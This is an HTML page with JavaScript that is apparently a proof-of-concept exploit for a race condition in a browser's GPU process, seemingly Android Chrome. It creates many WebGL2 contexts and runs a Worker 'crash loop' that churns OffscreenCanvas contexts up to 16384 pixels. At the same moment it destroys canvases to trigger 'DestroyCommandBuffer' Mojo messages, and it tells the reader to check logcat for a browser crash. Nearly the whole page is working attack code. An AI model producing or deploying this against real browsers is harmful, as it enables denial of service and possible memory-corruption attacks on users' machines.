<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
};

(async function() {
  // 1. Create multiple contexts to increase race chance
  const canvases = [];
  const gls = [];
  for (let i = 0; i < 20; i++) {
    const c = document.createElement('canvas');
    c.width = c.height = 1;
    document.body.appendChild(c);
    const gl = c.getContext('webgl2', { preserveDrawingBuffer: true });
    if (gl) {
      gls.push(gl);
      canvases.push(c);
    }
  }
  log(`Created ${gls.length} contexts.`);

  // 2. Start GPU crash in a Worker (YOUR ORIGINAL CRASH LOOP)
  const crashWorker = new Worker(URL.createObjectURL(new Blob([`
    // Original synchronous crash loop
    (function() {
      const attrs = [
        { powerPreference: 'high-performance' },
        { powerPreference: 'low-power' },
        { desynchronized: true },
        { preserveDrawingBuffer: true },
        { failIfMajorPerformanceCaveat: false },
        { xrCompatible: true }
      ];
      for (let w = 1; w <= 16384; w *= 2) {
        for (let h = 1; h <= 16384; h *= 2) {
          for (const attr of attrs) {
            try {
              const canvas = new OffscreenCanvas(w, h);
              const gl = canvas.getContext('webgl2', attr);
              if (!gl) continue;
              gl.clear(gl.COLOR_BUFFER_BIT);
              gl.flush();
              canvas.width = 0;
              canvas.height = 0;
            } catch(e) {}
          }
        }
      }
      postMessage('crash_done');
    })();
  `], { type: 'application/javascript' })));

  // 3. IMMEDIATELY destroy all contexts (send DestroyCommandBuffer)
  log('Destroying contexts...');
  for (const c of canvases) {
    c.width = 0;   // sends DestroyCommandBuffer Mojo message
  }

  // 4. Wait for worker to finish (GPU should be dead by now)
  crashWorker.onmessage = (e) => {
    log('Crash worker finished. Check logcat for browser crash!');
  };
})();
</script>
</body>
</html>
